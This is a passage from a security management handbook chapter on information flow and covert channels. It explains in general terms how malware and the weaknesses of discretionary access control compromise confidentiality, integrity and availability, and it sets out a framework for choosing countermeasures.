input, such as a keyboard, is intercepted by a device driver that passes it along to the 
messaging subsystem. Processes retrieve messages directed to them from the mes-
saging subsystem. User process #1 uses system call #1 to read and write information 
to local storage. It also uses system call #2 to communicate with user process #2. 
Communication with external processes is occurring with user process #2 through 
system call #3. Data is also being sent to an output device through system call #4 by 
user process #2. It is evident from this example that there are many possible paths 
for information to flow within a modern operating system.
Unfortunately, the open architecture of modern operating systems has a down-
side. The rich extensibility and reusability of code has made it easy for malevolent 
individuals to produce malicious code. The sinister processes concocted by social 
deviants, political rivals, and criminals exploit aspects of an open architecture to 
subvert the security services of the system. We can observe in Figure 20.8 some 
of the more common uses of malicious code to compromise a system. A Trojan 
horse executing as its own process in the context of a user has access to all of the 
same objects and services available to the user. If the user has sufficient privileges, 
a Trojan could create and load new services or device drivers. For instance, an 
Evil Device Driver could be installed to intercept all communications between 
the keyboard device and the messaging subsystem, compromising all keystrokes, 
including passwords and other sensitive information. The Trojan could also cre-
ate its own information flows by accessing stored data through system call #1 and 
sending it on to the attacker through the communications interface via system call 
#2. Most viruses are associated with an infected process. Typically, they propagate 
by infecting other files. In the diagram, we can see that a virus could infect other 
files using system call #1 to read and write data. A virus causes information to 
flow from itself, which also happens to look like itself, into other executable files. 
Spyware is a special type of malicious code that is most interested in capturing 

250  ◾  Information Security Management Handbook
user activity. One of the most notorious features of spyware is its ability to cap-
ture passwords. On Windows systems, this is usually accomplished through a 
special system call which allows a thread to receive all keystroke activity that 
passes through the messaging subsystem. Although it is not depicted, spyware 
typically causes captured information to flow to the file system or the communica-
tions interface, or both. Vulnerabilities are sometimes present in applications. The 
most notorious of these is the buffer overflow. This type of vulnerability is often 
exploited by causing the vulnerable process to execute a new process or thread 
within its context. In either of these cases, the new thread has the same contextual 
privileges as the vulnerable process. Worms have been known to leverage vulner-
abilities by creating new threads within a process. The new Evil Thread, resulting 
from a buffer overflow in user process #2, can seek out other victims through the 
communications interface via system call #3. Clearly, malicious software leverage 
published interfaces as well as weaknesses within an open architecture to accom-
plish devious tasks.
20.7  Complications
Information can be fragile. It can be impacted within any of the processing states 
noted in the IA model (Maconachy et al. 2001). Actions that impact information 
Trojan
Virus
User Process #1
Spyware
User Process #2
Evil
Tread
Messaging
User Mode
Kernel Mode
System
Call #1
System
Call #2
System
Call #3
System
Call #4
Inter-process
Communication
Evil
Device
Driver
Device
Driver
Device
Driver
Device
Driver
Device
Driver
Input
Storage
Communications
Output
Device
Driver
Figure 20.8  Compromised operating system.

Information Flow and Covert Channels  ◾  251
flow can result in compromises to the CIA of the affected data. The movement of 
information is so pervasive within a system that there are numerous places where 
information flow can be compromised. Confidentiality of information flows can 
be compromised through malicious acts of surreptitious data capture. Similarly, 
confidentiality can also be compromised through unencrypted network commu-
nications. Data integrity is vulnerable to changes during any of the information 
states. Given the integrity is not assured, it becomes apparent that availability is also 
jeopardized. Consider the situation where a message in transit is overwritten with a 
repeating character. This violation to the message’s integrity also impacts its avail-
ability. In modern operating systems, the problem of information fragility can be 
attributed to weaknesses inherent in today’s predominant access control methods.
Discretionary access control (DAC) is known to have weaknesses that affect 
the CIA of the system or application where it is used (Downs et al. 1985). This is 
related to the attributes of DAC and is manifested through the Trojan horse threat. 
The underlying premise of DAC is that an object owner retains the discretion to 
identify who (subject) may have what (privilege) access to the object. An object 
owner first identifies other subjects who are authorized access to their object. Then 
the owner specifies what privileges are permitted on the object. Some of the more 
common privileges include read, append, modify (or write), delete, and execute. 
The read privilege permits a subject the ability to access the object and read its con-
tents. Append allows a subject to add information to an object. The modify privi-
lege enables any change to information in the object. The delete privilege grants 
the subject the right to remove pointers to the object. A subject with the execute 
privilege is allowed to invoke the object as a process. The read privilege is the most 
problematic privilege regarding information flows. This privilege essentially allows 
the subject to create a copy of the object in memory. As such, it must be understood 
that the read privilege does not imply read-only; rather, it really means the right to 
make a copy of the object. As such, information can easily flow from one object to 
another even if this was not the intent of the owner of the original object.
Figure 20.9 provides a scenario that describes the aforementioned weaknesses 
in DAC. We see in the figure that Alice has created document A and allowed Bob 
the privilege to read it and write to (modify) it. Unbeknown to Bob, a Trojan horse 
is running in his context. It has all of the same rights and privileges as Bob. Bob 
was duped by Troy to run the malicious code. Troy now has unauthorized access to 
document A through the Trojan horse, which he controls remotely. Troy uses the 
malicious code along with Bob’s privileges to read document A and makes a copy of 
it. This violates the confidentiality of the document. Troy then directs his malicious 
code to overwrite the contents of document A with the phrase, “I WIN!!” With 
one fatal command, Troy has compromised the integrity of the document and has 
made the information unavailable. He completes his devious scheme by providing 
a copy of document A to Mallory, who pays handsomely for the exact information 
originally contained in document A. From this scenario, it is easy to understand 
how the weaknesses of DAC impact information flow assurances.

252  ◾  Information Security Management Handbook
20.8  Attack Methods
Directed attacks against information flows can be broadly categorized as physical 
or logical. Physical attacks involve actions that require physical human intervention 
to disrupt or intercept information flows. Logical attacks are those that use manual 
or automated techniques to compromise the security service most often through 
DAC weaknesses. Within each of these categories, we can further classify attacks 
based on their circumvention of the CIA security services. Table 20.1 provides an 
overview of some of the possible attacks against information flows.
With respect to confidentiality, a directed attack is most likely concerned with 
capturing information for illicit purposes. Physical approaches attempt to intercept 
information flows to capture the desired information directly. Outright theft of 
media and system components is the obvious course of action. Theft of system 
backups can provide instant access to an organization’s most sensitive information. 
Keystroke loggers placed inline with keyboards can capture sensitive information 
as it is typed. The most likely motive of the physical keystroke logger is to capture 
passwords that enable the attacker to masquerade as the affected authorized user. 
Sensitive information commonly traverses organizational internal networks and is 
subject to interception. An attacker may use specialized tools to intercept network 
traffic passing a particular node in the network. Physical access to network backbone 
Mallory
Copy of Document A
Troy
Remote
control
Troy creates a copy of
Document A and gives
it to Mallory.
Troy–owner
Mallory–Read
Access Control List
Troy uses a Trojan
horse executing in Bob’s
context to read and write
to Document A.
Document A
Alice creates
Document A.
Bob Reads
Document A.
Bob
Trojan
horse
Alice
Alice–Owner
Bob–Read/Write
Access Control List
Figure 20.9  Weaknesses of DAC exemplified.

Information Flow and Covert Channels  ◾  253
media provides an attacker with the opportunity to intercept most, if not all, traf-
fic within an organization. This is possible when the attacker either splices the 
cable or uses inductive methods to intercept the traffic. Dumpster diving and social 
engineering rely on the mistakes of others to gain access to sensitive information. 
Logical attacks are primarily manifested as an abuse or unauthorized use of system 
credentials. Malicious software, backdoors, and covert channels provide automated 
means to compromise information confidentiality. Malicious software running in 
the context of the user can compromise information in files accessible to the user. 
These can also capture other activity, such as keystrokes or screen images, as a way 
to steal information as well. Backdoors may provide a means to circumvent existing 
controls allowing unauthorized or unaccounted access to information processed. 
Table 20.1  Directed Attacks
Physical
Logical
Confidentiality (theft)
Media theft
Malicious code
System component 
theft
Removable media
Physical keystroke 
logger
Printouts
Network traffic 
interception
Network transmission
Dumpster diving
Backdoors
Social engineering
Covert channels
Privilege escalation
Integrity (manipulation)
Network traffic 
interception
Malicious code
Direct storage access
Abuse of privileges
Information warfare
Backdoors
Privilege escalation
Availability 
(obstruction)
Network traffic 
interception
Malicious code
System destruction
Bots and zombies
Component theft
Abuse of privileges
Media destruction
Backdoors
Media overwrite
Privilege escalation

254  ◾  Information Security Management Handbook
Covert channels enable the surreptitious transfer of information through innocu-
ous methods. Inappropriate diversions of sensitive information by authorized users 
are commonly accomplished by printing, removable media, or through network 
transmissions such as e-mails and peer-to-peer networking. Insiders with special 
rights, such as administrators, may give themselves inappropriate access to informa-
tion through privilege escalation. Compromise of information flow confidentiality 
can be difficult to detect. When a compromise is detected, the results can be dev-
astating to the organization.
Attacks directed at information flow integrity seek to alter the original data. 
Some aspects of IT have inherent integrity mechanisms to assure or detect 
changes to data integrity. Cyclic redundancy checks are commonly used in net-
work protocols to detect changes to data. Hashing techniques are employed with 
cryptographic measures to detect unauthorized changes to data. Transaction 
processing assures only valid data is written to a file system or database. Aside 
from hashing, most of the IT integrity mechanisms are designed to detect or cor-
rect errors during processing. In many cases, the error detection mechanisms are 
of no consequence when the data is manipulated prior to or after the integrity 
check. Although the IA model includes integrity as an important aspect, it is 
seldom given the necessary attention by system owners and security profession-
als. Physical attacks against integrity involve the unauthorized manipulation of 
data from its original form. Data traversing a network is vulnerable to intercep-
tion and manipulation. A malicious router could be used to alter data packets 
in transit. Physical access to storage media allows an attacker to alter any file it 
contains. This is easily accomplished for removable media. System media, such as 
hard drives, can either be removed or the system booted to an alternate operating 
system that mounts the target media, allowing file manipulation. Information 
warfare involves changes to specific information within a system to achieve a 
desired effect on the target organization. An attacker using information warfare 
tactics may involve small changes to information, causing the organization to 
make decisions that benefit the attacker (Waltz 1998). Logical attacks to integ-
rity generally leverage the credentials of authorized users to change information. 
Malicious code executing in the context of a user could make any change nor-
mally authorized for the user. The most likely change would be file corruption. 
Insiders may abuse their authorized access and change information in a system. 
They may make unauthorized changes to important documents, Web content, or 
database fields. Organizations seldom institute appropriate integrity validation 
checks to assure that changes made to important information are appropriate or 
authorized. At best, fields in a database may have some auditing enabled to iden-
tify who made the changes. Backdoors allow an attacker to change information 
surreptitiously and may even avoid audit detection mechanisms. An authorized 
user with the capability to escalate their privileges could make changes to infor-
mation that may go unnoticed. Undetected changes to information integrity may 
cause an organization to make poor decisions. Attackers can take advantage of a 

Information Flow and Covert Channels  ◾  255
lack of integrity change detection in information flows to manipulate organiza-
tional actions to their benefit.
Availability could be referred to as the mantra of IT professionals and managers. 
It is a goal equally shared by security and operations professionals. The availability 
of an information flow is commonly affected by obstruction techniques such as data 
destruction and denial-of-service attacks. These types of attacks can be perpetrated 
through a variety of physical and logical techniques. Physical availability attacks 
attempt to disrupt system components. This includes severing network connections 
and damaging hardware components. Critical system components, such as routers 
and switches, could also be stolen from the premises. Although this involves sever-
ing a network connection, it is more problematic as a necessary component of the 
network is now missing. Storage media may also be subjected to attack. Backups 
could be physically damaged. Exposing magnetic media to strong magnetic fields 
could alter the stored data and prevent recovery. Similarly, malicious individuals 
could use overwrite utilities coupled with their physical access to deny access to 
stored information. Logical attacks against availability are well known. Viruses 
have been known to corrupt or encrypt files preventing access to its contents. 
Worms have caused systems and services to become unavailable for use. Bots and 
zombies have been used to launch distributed denial-of-service attacks against a 
selected target, preventing others from accessing the system resources. Insiders have 
been known to delete or corrupt critical files. Backdoors provide another means to 
damage or remove information surreptitiously, making it unavailable. Insiders with 
the ability to elevate their privileges could also damage or remove selected files, 
denying authorized users access to the information. Given the commonality of the 
availability security service, attacks against it will likely be reacted to by the opera-
tions and security staff. However, such attacks can still be difficult to detect in some 
cases and problematic to counter in others.
20.9  Selecting Countermeasures
Ascribing the appropriate countermeasures to protect information flows should 
proceed from a logical framework, which considers several important elements. 
Utilizing a framework enables the possibility for consistent application of the ele-
ments and repeatability for organizational processes. Figure 20.10 proposes one 
framework useful for selecting the appropriate controls for information flows. The 
essential elements concentrically displayed in the figure from the center out include 
data, subjects, information flows, security services, and countermeasures. Each ele-
ment can also be described as a series of questions that allows a logical progression 
from data to protection. In this regard, it can be asked, with respect to:
Data: What must be protected? Critical and sensitive information within any 
◾
◾
of the system states that requires protection should be explicitly identified.

256  ◾  Information Security Management Handbook
Subjects: Who is allowed to interact with the information? This should include 
◾
◾
all entities to include users, groups, automated processes, and services.
Information flows: Where will the data travel? Identification of the informa-
◾
◾
tion flows at the micro and macro levels are necessary to implement or evalu-
ate the security controls at each state.
Security services: Which of the services are necessary? This level should incor-
◾
◾
porate security requirements and risk-based processes to identify the degree 
of protection necessary.
Countermeasures: How is the information flow protected? The selection of 
◾
◾
controls and the depth and breadth of their placement with respect to the 
information flow is predicated on the prior elements.
20.9.1  Data
IT systems host a wide variety of information and their respective flows. Some 
information is sensitive; some is not. Information may not be particularly sensi-
tive in some situations, but may allow a fraud if the wrong individuals are per-
mitted access or can manipulate it. The first step to protect information flows 
requires the identification of information that needs security controls. Several 
types of information an organization should consider protecting are identified in 
the following list:
 
WHAT is protected
WHO uses it
WHERE it goes
WHICH services
HOW protected
Data
Subjects
Information ﬂows 
Conﬁdentiality
Countermeasures
Integrity
Availability
Integrity
Figure 20.10  Countermeasure selection process.

Information Flow and Covert Channels  ◾  257
Passwords: Exposure of passwords can result in masquerading attacks or sys-
◾
◾
tem compromise.
Salaries: Unauthorized disclosure of this information can affect employee 
◾
◾
morale.
Customer lists and contacts: This type of information is usually proprietary and 
◾
◾
could put an organization at a disadvantage, if it is revealed to competitors.
Business strategic plans: Another type of information that could hurt an 
◾
◾
organization, if competitors acquire it.
Privacy information: Employee and customer information should be pro-
◾
◾
tected from unauthorized disclosure. Breaches in this type of information 
can result in a direct expense to the organization, if it is required to pay for 
monitoring services for those affected.
Research and development activities: Release of this information could cost 
◾
◾
an organization all of the resources invested in obtaining a competitive 
advantage. Unauthorized changes to the information may impact the success 
of a project or the survival of the organization itself.
Intelligence on competitors: Information obtained about competitors can 
◾
◾
affect the actions of the organization. Exposure of its contents or malicious 
changes to this information could cause the organization to take an inappro-
priate course of action.
Proprietary information: This broad category includes any information an 
◾◾
organization uses that it deems necessary to protect from disclosure. Likewise, 
this information may also need to be protected from unauthorized changes. 
Disclosure or inappropriate changes to this information may impact the ability 
of the organization to service customers properly or to remain competitive.
Trade secrets: Confidential processes, procedures, and techniques an orga-
◾
◾
nization uses to give it a competitive edge typically fall into this category. 
Disclosure or unauthorized changes to this information could impact the 
effectiveness of the organization.
Organizational alliances: An organization may share processes or activities 
◾
◾
with other organizations. Disclosure of this activity may cause damage to 
reputations or violate agreements.
Accounting and budget information: In most cases, financial information 
◾
◾
integrity must be protected from unauthorized changes. Confidentiality for 
some aspects of financial information should also be protected from unau-
thorized disclosure. Weaknesses in systems processing accounting informa-
tion may allow the perpetration of a fraud.
System configurations: Generally, configurations do not need protection from 
◾
◾
a confidentiality standpoint. However, the integrity of the configurations is 
very important. Unauthorized configuration changes can affect all of the sys-
tem security services and have undesirable consequences to the information 
stored, processed, and transmitted by the system.

258  ◾  Information Security Management Handbook
Transaction processing: Systems with a database back end, such as e-com-
◾
◾
merce applications, require a high degree of availability and integrity for 
transaction processing. Confidentiality is also a factor when privacy or finan-
cial data is an aspect of the transaction. Breaches of these services can result 
in irreparable harm to the public goodwill or to an organization’s image, as 
well as financial loss.
Cryptographic keys: Private and secret keys require each of the security ser-
◾
◾
vices to be in place for secure communications. A breach of one of the secu-
rity services will at best deny access or at worst facilitate a compromise of the 
protected information. Public keys require integrity and availability security 
services. A public key that is not protected could be leveraged by an attacker 
by substituting another key for the purpose of launching a man-in-the-mid-
dle attack.
20.9.2  Subjects
An IT system may host an enormous variety of entities. The diversity of user 
accounts can be immense. However, those who should be permitted access to 
a particular piece of sensitive data are likely to be dramatically reduced when 
considerations are given to separation of duties and least privilege. We can 
divide subjects that are authorized access to a data element between humans 
and automated processes. Humans are the primary consumers of informa-
tion. Automated processes typically exist to facilitate the connection between 
humans and their information. In the same manner, human access is scruti-
nized to determine that if interaction with the information flow is appropri-
ate, the same level of inspection of automated processes should occur. Just as 
humans may make poor decisions regarding the information flows, automated 
processes may also make mistakes. Sensitive information may be left in tempo-
rary files, transmitted unencrypted, or diverted in the case of a breach to the 
program logic, which may occur when a worm exploits a buffer overflow. The 
following list describes some of the common types of subjects associated with 
modern IT systems:
Ordinary users: By and large, this type of subject comprises the bulk of sub-
◾
◾
jects within a system. Roles and groups are commonly used to provide separa-
tion and segregation between ordinary users. Consideration should be given 
when allowing multiple users or groups access to an information flow. Due to 
the weaknesses in DAC previously described, an intended information flow 
can quickly be diverted with unsavory consequences.
System administrators: The deity-like powers wielded by system administra-
◾
◾
tors can cause information flow assurance efforts to be very tenuous. An inor-
dinate amount of trust is sometimes placed in these personnel. Their actions 

Information Flow and Covert Channels  ◾  259
or inactions can have a tremendous effect on information flows. Although 
they have significant access, they should nonetheless be limited and moni-
tored where possible. It is not suggested that they should not be trusted, but 
rather their actions should be confirmed. The favorite phrase of former U.S. 
President Ronald Reagan, “Trust, but verify,” should be followed regarding 
those with extensive access or rights in a system.
Database administrators: The two primary repositories of information are 
◾
◾
data files and databases. Most database management systems require experts 
to maintain them. The database administrator typically has broad powers 
within the database similar to those of the system administrator for an oper-
ating system. Similarly, database administrator actions should be controlled 
and monitored to the greatest extent possible.
Developers: These individuals create new software solutions for use, 
◾
◾
sale, or lease by an organization. Their creations can run in the context 
of the system, user, or both. Security within a system is predicated on 
proper software coding to avoid the inadvertent creation of a vulnera-
bility. Often, their work products are trusted implicitly. Because their 
creations will likely have access to information flow of which they are 
not authorized, developers should be prevented from accessing systems 
where their products are deployed. Developers frequently have elevated 
privileges to construct their software products. As such, their activities 
should be segregated from production systems to provide assurances for 
information flow which might be intentionally or inadvertently affected 
by a developer.
System accounts: In most cases, a system is implicitly trusted. We expect 
◾
◾
it to function properly and provide the appropriate protections as specified 
by the vendor. Most IT systems have a specialized account maintaining the 
core of the system. The system or root account generally has unobstructed 
access to all information flows within a machine. Any compromise of this 
account breaks most, if not all, security aspects of a system. These omnipo-
tent accounts must be continuously guarded and monitored for compromise. 
Because the system account typically mediates the security services of a sys-
tem, subversion of the account can allow an attacker to bypass much of the 
security that may be in place.
Service accounts: Some system services require credentials similar to that 
◾
◾
of a user or administrator. In these cases, the service executes with its own 
account and context. A service account often mediates actions on behalf of 
system users. For example, a Web server mediates user requests for hyper-
text documents. In another example, a backup service mediates requests by 
administrators to backup or restore files. In both cases, the service accesses 
system resources that may not be directly accessible by the user. This some-
times requires special system permissions for these types of actions.

260  ◾  Information Security Management Handbook
20.9.3  Information Flows
The paths along which information may flow can be numerous; however, some 
paths are clearly unacceptable for information to flow. For instance, sensitive data 
protected internally through cryptographic techniques should not be found exiting 
the system in cleartext through an unrecognized port on a workstation. Strategic 
and tactical security measures should consider all of the components involved with 
an information flow. Predominant components involved in information flow are 
given from the micro level to the macro level in the following list:
Hardware: At the most fundamental level, information moves between hard-
◾
◾
ware components of a system. Information flows from keystrokes by way of 
interrupts into the central processor. Devices of all types exchange informa-
tion through pre-established protocols for the primary purpose of supporting 
information flows. Typically, most hardware is developed to comply with an 
open standard that may attempt to assure information flow integrity, but 
does not usually provide for confidentiality or availability.
Operating system and firmware: The usefulness of IT systems is predicated 
◾
◾
upon a flexible operating system. The operating system and firmware define 
the amount of extensibility available and the logical paths of information flow 
between hardware and software components. Some hardware devices rely 
exclusively on firmware for their interactive functionality. The information 
flow principles are the same at this level, whether it is an operating system or 
firmware. Both provide a capability for interaction for humans and other sys-
tem components. They are responsible for handling information flows associ-
ated with the device they control and often contain features that allow some 
degree of extensibility. From this perspective, the primary purpose of the 
operating system is to facilitate information flows.
Applications: Software programs, tools, and applications are the main pro-
◾
◾
ductivity instruments responsible for most information flows. Applications 
are used to create, update, transfer, and remove information. They provide a 
multitude of interactive features that allow for manual or automated handling 
of information flows. The nature of an application, predicated by its design, 
establishes the methods and functions used to manipulate data. Some appli-
cations are designed with extensibility features allowing third-party develop-
ers to provide enhancements. In this regard, an application can be used to 
manipulate information flows in ways never before imagined. The limit of 
what an application can do with information flows is bound by the creativity 
of the designers and constraints of the underlying operating system.
Intrasystem flow: Organizational systems are identified by boundaries estab-
◾
◾
lished by physical devices and logical control. Within a system, information 
flows between various components through network media. The common 
elements of intrasystem information flows include workstations, servers, and 

Information Flow and Covert Channels  ◾  261
network devices. A multitude of protocols support the transfer of information 
flows in a system. Some protocols, such as SSL, SSH, and IPSec provide pro-
tection of information flows using cryptographic techniques. Unfortunately, 
there are other protocols that transfer sensitive information with no protec-
tion at all. For example, Telnet transfers all information, including passwords, 
in cleartext. Protocols, ports, and addresses involved in an information flow 
should be known to devise the most appropriate countermeasures.
Intersystem flow: The open architecture of modern IT systems enables global 
◾
◾
connectivity between virtually all organizations that desire to exchange 
information flows. The Internet is, of course, the primary transport of inter-
system communications. The connectivity methods and issues for intersys-
tem information flows are the same for intersystem connections. The primary 
difference between the two is that an organization has more control and 
opportunities for security for intrasystem information flows with little or no 
assurance for intersystem communications. An organization connected to the 
Internet often relies on an agreement with its Internet service provider to 
obtain a specific level of security services for the interconnections.
20.9.4  Security Services
The security services of CIA are exhibited in a system through the implementation 
of countermeasures. Prior to selecting the necessary security countermeasures, it is 
imperative to know what level of protection is needed. Countermeasure implemen-
tation should be based on several factors. The level of protection needed is derived 
from an evaluation of requirements, data flows, and risk. These factors constitute a 
fundamental risk-based process for security countermeasure selection. Figure 20.11 
presents one technique that can be used to arrive at a countermeasure implementa-
tion strategy dependent on the aforementioned factors. The following items discuss 
each of the phases within the figure:
Requirements: The first step is to compile all security and functional require-
◾
◾
ments related to the information flow. Requirements are likely to be derived 
from organizational policies, industry best practices, as well as government 
laws and regulations. System design documentation should also be consid-
ered, because it will provide further insight into the logical and physical con-
straints on the information flows. Similar requirements should be grouped to 
minimize redundancy.
CIA initialization: Security services are commonly identified according to 
◾
◾
their degree of criticality, such as low, moderate, or high. A security service 
with a low criticality can mean that there is minimal need for the service 
and any compromise of the service is not likely to have much of an impact 
on system operations. A moderate criticality can be interpreted to mean that 
the disruption of the service would have a noticeable effect on the system or 

262  ◾  Information Security Management Handbook
organization, but would not necessarily prevent the organization or system 
from meeting its mission. Services with a high criticality level would have 
detrimental effects on the mission of the system or organization. Each require-
ment should be interpreted and associated with the relevant criticality of the 
security service. For instance, if a security requirement stipulated, “All LAN 
or WAN network traffic exiting the controlled space must be protected from 
compromise,” we would likely assume that the confidentiality requirement is 
high in this case. There is no mention of availability, so we would probably 
consider it low in this instance. However, integrity might be more difficult to 
assign. If the network traffic exiting the facility is maliciously changed, does 
this equate to a “compromise”? We might consider that any changes in data 
exiting the facility could be broadly interpreted as a compromise, although the 
common acceptance of the questionable term is most likely to mean an unau-
thorized exposure of the information. Conservatively, we might identify the 
integrity aspect as moderate because it is not explicit in the requirement. Thus, 
our CIA initialization for this particular example would be confidentiality = 
high, integrity = moderate, and availability = low. Each requirement grouping 
is uniquely identified and contains the properties of the CIA triplicate.
Data flow elements (DFE): These elements are brought forward from the 
◾
◾
three previous countermeasure selection activities of data, subjects, and infor-
mation flows. Information movement associated with these elements can be 
a one-to-one, a many-to-one, or a one-to-many situation. An example of a 
one-to-one case is when a user reads a file from local storage media. A many-
Requirements
Depth
and
Breadth
CIA
Initialized
CIA
Goal
Data
ﬂow
Elements
Operational
Risk
Management
Acceptance
CIA
Position
CIA
Objectives
Figure 20.11  Determining information flow countermeasures.

Information Flow and Covert Channels  ◾  263
to-one scenario involves converging information flows, such as multiple users 
accessing a single record in a database. A one-to-many situation occurs when 
a user e-mails an important document to multiple recipients. Arguably, we 
could also consider cases where a particular piece of information flows from 
many to many. We might characterize a file-sharing mechanism in this way. 
However, a many-to-many scenario can be very complex and difficult to 
assess. When possible, it would be more prudent to avoid this scenario and 
consider classifying the elements as one of those previously mentioned.
Breadth and depth (B&D): This aspect identifies the system functionality 
◾
◾
needed to support requirements versus the DFE. This process identifies the 
extent of coverage that will be necessary for countermeasure implementation. 
Thus, it is a preprocessing step that associates functional security implemen-
tations for the DFE with the security requirements.
CIA goal: At this stage, the DFE, applicable requirement groupings, and 
◾
◾
B&D aspects are merged to form the security service goal. CIA criticality 
results from the merging of the security requirement groupings associated 
with the DFE of interest. A high-watermark approach is suggested so that 
the most conservative security services are retained for the DFE. When com-
pleted, the DFE will contain properties that include the high-watermark CIA 
criticalities and the associated B&D.
Operational risk: This step represents the risk assessment process of the CIA 
◾
◾
goal. Any of the common risk assessment methodologies could be used in 
this phase. Threats, vulnerabilities, and their likelihoods that may impact the 
CIA goal are considered. For any identified weaknesses, costs to correct or 
mitigate the risk are associated with the properties of the DFE.
CIA position: Weaknesses and costs identified within the operational risk 
◾
◾
phase are associated with the affected DFE properties. This step serves to 
identify the transition from DFE security requirements to the perceived or 
actual risk to operations.
Management acceptance: System and information flow owners decide 
◾
◾
whether to accept the weaknesses identified or provide resources to correct 
them. Their decisions should consider resource availability and organiza-
tional mission requirements.
CIA objectives: The final output of this process is the identification of the 
◾
◾
CIA criticalities for each DFE and the necessary B&D of controls needed 
to meet management security expectations for the information flow consid-
ered. The CIA objectives form the basis for security countermeasure selec-
tion and implementation.
20.9.5  Countermeasures
Achieving information flow security in a system is indeed a difficult challenge. 
The distributed nature of modern systems complicates this problem even further. 

264  ◾  Information Security Management Handbook
Conceptually, the problem should be dealt with using the appropriate breadth and 
depth of security controls. If we consider the concept of the Trusted Computing 
Base (TCB) espoused by the U.S. Department of Defense’s Trusted Computer 
System Evaluation Criteria (TCSEC), then we can begin to formulate an appropri-
ate strategy. According to the TCSEC standard, security is achieved in the TCB 
through the sum of the controls; a simplistic view is the old adage that security 
is only as strong as the weakest link. In this regard, we must consider where the 
weakest links are and how to reinforce them. Ideally, all countermeasures will have 
some form of backup or redundancy that results in a layering of controls. A defense-
in-depth strategy is best achieved when different countermeasures are used as the 
backup or redundancy. This provides an effective opportunity to catch compro-
mises or violations in the event a particular countermeasure fails or is bypassed.
A large variety of countermeasures can be implemented to protect informa-
tion flows. Several examples of typical countermeasures that can be used to pro-
tect information flows are identified in Table 20.2. We assert that countermeasures 
have effectiveness in the physical and logical realms when properly implemented. 
Countermeasures can impact either or both realms where information resides. For 
this discussion, we consider impacts to information flows that are contained within 
a system. A countermeasure is considered direct or substantive if its implementa-
tion provides a consistent mechanism for detecting, preventing, or deterring attacks 
against an information flow. Substantive countermeasures tend to be technical and 
have a level of robustness that is not necessarily easy to circumvent. We consider a 
countermeasure to have an indirect or minimal impact when the mechanism weakly 
or periodically supports a mechanism that could detect, prevent, or deter attacks. 
An indirect countermeasure may be somewhat easy to circumvent or manipulate.
Policies and procedures: This directive control does not typically provide a 
◾
◾
technical countermeasure for protecting information flows. However, the lack 
of policies and procedures will likely result in poor selection and implementa-
tion of needed countermeasures. The impact is indirect, but any lack in this 
countermeasure may directly contribute to weaknesses in the system. Policies 
and procedures can span both physical and logical aspects of a system.
Inventories: We consider the systematic process of verifying assets an “inven-
◾
◾
tory.” From a physical standpoint, inventories of assets such as servers, work-
stations, and backup media provide an indirect impact on information flows 
through the equipment and media validation. Logical inventories, which 
consider binary integrity for system and application software, also provide a 
substantive impact on information flows when conducted, but are less mean-
ingful as the time between validations increases. A lack of physical and logi-
cal inventories can interrupt or compromise the flow of information.
System inspection: An inspection of an IT system can be conducted from 
◾
◾
physical and logical perspectives. Whereas an inventory seeks to validate the 
existence of known assets, an inspection attempts to identify aspects of a 

Information Flow and Covert Channels  ◾  265
system that are out of the ordinary. On the physical side, this involves looking 
at system components to identify signs of tampering. Indications of tamper-
ing include breakage of tamper evidence seals, missing or loose screws, as well 
as the existence of unauthorized components such as rogue wireless access 
points or keyboard-attached keystroke loggers. Logical system inspections 
identify the existence of unauthorized software. Inspections are an effective 
means of validating the existence of necessary components, as well as unau-
thorized devices. However, due to their periodic nature, they tend not to 
provide a robust control for information flows. Physical inspections require 
Table 20.2  Typical Countermeasures and Perceived Impact
Physical
Logical
C
I
A
C
I
A
Policies and procedures






Inventories



System inspection






Facility access control



Facility intrusion detection



User security training






Separation of duties






Least privilege






Least functionality



Logical access control



Encryption




Audit



Backup



Security control testing






Vulnerability scanning



Integrity monitoring



System intrusion detection



Malicious code monitoring



Note:	  = Indirect or minimal impact;  = direct or substantive impact.

266  ◾  Information Security Management Handbook
dedicated human resources that can be costly, if done regularly. Logical 
inspections can be automated, which reduces human resource requirements, 
but tools used for periodic or near-real-time inspections can be expensive. It 
is considered that most logical inspections are periodically conducted in less-
than-daily intervals. Thus, the effectiveness of this control in both realms is 
indirect due to the diminishing value of the results over time.
Facility access control: The application of granular physical access controls 
◾
◾
provides the opportunity to control physical access to data flow points within 
a system. For instance, access control, which prevents most individuals from 
accessing servers, networking equipment, and communication closets, can 
mitigate a host of insider threat issues. Furthermore, it serves as a layered 
protection mechanism to identify physical attacks from external entities. 
Preventing physical access to sensitive equipment and areas clearly supports 
the need for information flow confidentiality. It also supports integrity where 
unauthorized individuals are denied the ability to tamper with sensitive 
equipment or are prevented from entering sensitive areas. Similarly, tamper 
prevention also provides assurances that those system components protected 
will be available for authorized users. When the access control system con-
tains an auditing mechanism, it can also provide accountability for individu-
als authorized access to an area with protected resources. Thus, this serves as 
a deterrent to insider threats.
Facility intrusion detection: This countermeasure ordinarily provides peri-
◾
◾
odic coverage for a system. Facility intrusion detection zones are usually dis-
abled during normal working hours. Thus, their typical usage is periodic. 
However, there are some implementations where a zone remains active at all 
times. For instance, a protected room with a false ceiling may require con-
tinual monitoring for unauthorized entry. In this case, the zone may be active 
for long periods except during times of maintenance in the area. The typical 
monitoring for this countermeasure is periodic. As such, a facility IDS only 
minimally impacts the security services from a physical perspective.
User security training: The traditional base for security is training. Users need 
◾
◾
to be made aware of what activity is acceptable and what is not. They should 
also be made aware of attack indicators. Training can be used to inform users 
about the physical and logical ways a system is attacked and actions they 
should take when they witness these events. Unfortunately, training is peri-
odic and may not stay with the user mentally. Some users can also become 
complacent or careless regarding security. Although training is very impor-
tant, its impact is considered limited due to the aforementioned factors.
Separation of duties: The actions and access of individuals can be controlled 
◾
◾
through this countermeasure. From the standpoint of the physical realm, 
system components can be protected from accidental and intentional actions 
by individuals. For instance, promulgating a policy that prohibits ordinary 
users from unescorted access in server rooms supports separation of duties. 

Information Flow and Covert Channels  ◾  267
However, it is further reliant on other controls, such as access control systems 
and logs, to enforce the policy. Given this secondary reliance, separation of 
duties is considered to have only a minimal impact for physical security. In 
contrast, many IT systems can be configured to support separation of duties. 
Inherent access control mechanisms coupled with the assignment of permis-
sions through groups or roles enables logical methods to enforce separation 
of duties. Implementations through system logic can result in substantive 
controls of information flow confidentiality and integrity when implemented 
properly. Separation of duties implementations are not ideally suited to pro-
vide availability assurances. However, by virtue of limiting access, it is con-
sidered that separation of duties does at least minimally impact availability.
Least privilege: Providing individuals with access to only those resources needed 
◾
◾
in the performance of their duties embodies the concept of least privilege. We 
